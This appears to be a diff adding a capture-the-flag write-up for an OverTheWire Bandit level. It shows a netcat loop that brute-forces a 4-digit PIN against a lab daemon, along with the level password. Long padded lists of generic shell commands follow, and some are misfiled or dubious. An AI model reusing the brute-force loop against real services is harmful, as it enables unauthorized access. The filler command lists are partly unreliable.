@@ -1,0 +1,306 @@
+# Bandit Level 24 → Level 25
+
+## Level Goal
+Menemukan password untuk level selanjutnya dengan melakukan brute force terhadap daemon yang berjalan di port 30002. Daemon akan meminta password level saat ini dan PIN 4 digit.
+
+## Detailed Command Breakdown
+
+### 1. SSH Connection
+```bash
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+
+### 2. Script Creation
+```bash
+# Create working directory
+mkdir -p /tmp/mydir
+cd /tmp/mydir
+
+# Create brute force script
+cat > brute.sh << 'EOF'
+#!/bin/bash
+for i in {0000..9999}; do
+    echo "UVP4SABS3QGE6F6BQ2NWJA4KTJG5WSQJ $i"
+done | nc localhost 30002
+EOF
+
+chmod +x brute.sh
+```
+
+## Brute Force Techniques
+
+### 1. Password Generation
+```bash
+# Sequential numbers
+seq -w 0 9999
+
+# Random numbers
+shuf -i 0-9999 -n 1000
+
+# Pattern generation
+printf "%04d\n" {0..9999}
+```
+
+### 2. Network Connection
+```bash
+# Netcat connection
+nc localhost port
+nc -v localhost port
+
+# Telnet connection
+telnet localhost port
+```
+
+### 3. Data Processing
+```bash
+# Filter output
+grep -A1 "Correct"
+grep -B1 "Wrong"
+
+# Count attempts
+wc -l < output
+grep -c "Wrong" output
+```
+
+## Script Optimization
+
+### 1. Parallel Processing
+```bash
+# GNU Parallel
+parallel -j4 ./script.sh ::: {0..9}
+
+# Background jobs
+for i in {0..9}; do
+    ./script.sh "$i" &
+done
+wait
+```
+
+### 2. Resource Management
+```bash
+# CPU priority
+nice -n 19 ./script.sh
+renice +19 -p $$
+
+# Memory limits
+ulimit -v 512000
+```
+
+### 3. Performance Monitoring
+```bash
+# System load
+uptime
+vmstat 1
+
+# Process stats
+pidstat 1
+sar -u 1
+```
+
+## Network Operations
+
+### 1. Connection Management
+```bash
+# Connection testing
+nc -zv localhost port
+telnet localhost port
+
+# Connection monitoring
+netstat -ant | grep port
+ss -ant | grep port
+```
+
+### 2. Data Transfer
+```bash
+# Send data
+echo "data" | nc localhost port
+printf "data\n" | nc localhost port
+
+# Receive data
+nc -l -p port > output
+nc -l -p port | process
+```
+
+### 3. Connection Control
+```bash
+# Timeout
+timeout 5s nc localhost port
+nc -w 5 localhost port
+
+# Rate limiting
+pv -L 1k | nc localhost port
+```
+
+## Data Processing
+
+### 1. Text Processing
+```bash
+# Filter lines
+grep pattern file
+sed -n '/pattern/p' file
+
+# Transform data
+tr 'old' 'new'
+sed 's/old/new/g'
+```
+
+### 2. Data Analysis
+```bash
+# Count occurrences
+sort | uniq -c
+awk '{count[$1]++} END {for(i in count) print i,count[i]}'
+
+# Statistical analysis
+awk '{sum+=$1} END {print sum/NR}'
+```
+
+### 3. Pattern Matching
+```bash
+# Regular expressions
+grep -E 'pattern'
+awk '/pattern/'
+
+# Complex patterns
+perl -ne 'print if /pattern/'
+```
+
+## Security Considerations
+
+### 1. Rate Limiting
+```bash
+# Sleep between attempts
+sleep 0.1
+
+# Batch processing
+xargs -n 100 -P 4
+
+# Connection pooling
+socat TCP-LISTEN:port,fork,reuseaddr -
+```
+
+### 2. Resource Control
+```bash
+# Process limits
+ulimit -n 1024
+ulimit -u 100
+
+# Bandwidth control
+tc qdisc add dev eth0 root tbf rate 1mbit
+```
+
+### 3. Error Handling
+```bash
+# Connection errors
+if ! nc -z host port; then
+    handle_error
+fi
+
+# Timeout handling
+timeout 5s command || handle_timeout
+```
+
+## Performance Optimization
+
+### 1. Script Efficiency
+```bash
+# Buffered output
+buffer -s 64k command
+
+# Batch processing
+xargs -n 1000 command
+
+# Pipeline optimization
+command | buffer | process
+```
+
+### 2. System Tuning
+```bash
+# Network settings
+sysctl net.ipv4.tcp_fin_timeout
+sysctl net.core.somaxconn
+
+# Process settings
+sysctl kernel.pid_max
+sysctl kernel.threads-max
+```
+
+### 3. Resource Allocation
+```bash
+# CPU affinity
+taskset -c 0,1 command
+
+# Memory allocation
+cgroups-mount
+```
+
+## Troubleshooting
+
+### 1. Common Issues
+- Connection refused
+- Timeout
+- Resource exhaustion
+- Rate limiting
+
+### 2. Solutions
+```bash
+# Debug connection
+nc -v localhost port
+telnet localhost port
+
+# Monitor resources
+top
+htop
+```
+
+### 3. Logging
+```bash
+# Script logging
+script.sh 2>&1 | tee log
+exec 2> >(tee -a error.log)
+
+# Network logging
+tcpdump -i any port port
+wireshark -i any
+```
+
+## Best Practices
+
+### 1. Attack Strategy
+- Start simple
+- Increase complexity
+- Monitor resources
+- Handle errors
+
+### 2. Performance
+- Batch processing
+- Parallel execution
+- Resource control
+- Error recovery
+
+### 3. Security
+- Rate limiting
+- Resource limits
+- Error handling
+- Clean exit
+
+## Additional Resources
+
+### 1. Man Pages
+```bash
+man nc
+man parallel
+man tcpdump
+man ulimit
+```
+
+### 2. Documentation
+- Network Programming
+- Performance Tuning
+- Security Guide
+- Debugging Tools
+
+### 3. Tools
+- Network utilities
+- Performance monitors
+- Debug helpers
+- Analysis tools
